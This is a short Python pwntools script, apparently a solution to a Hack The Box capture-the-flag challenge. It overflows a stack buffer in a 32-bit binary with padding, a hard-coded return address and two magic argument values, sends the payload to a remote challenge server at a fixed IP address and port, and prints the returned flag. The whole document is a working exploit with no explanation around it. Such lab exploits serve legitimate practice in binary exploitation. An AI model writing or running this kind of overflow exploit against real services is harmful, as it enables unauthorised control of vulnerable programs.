from pwn import *

binary = context.binary = ELF('./vuln')

payload = b'A'*(0xb8+4)
payload += p32(0x080491E2)
payload += p32(0x1234)
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)

#p = process('./vuln')
p = remote('142.93.35.92',31729)
p.sendline(payload)
p.recvuntil(b'HTB')
str = p.recv(1024)
print(str)
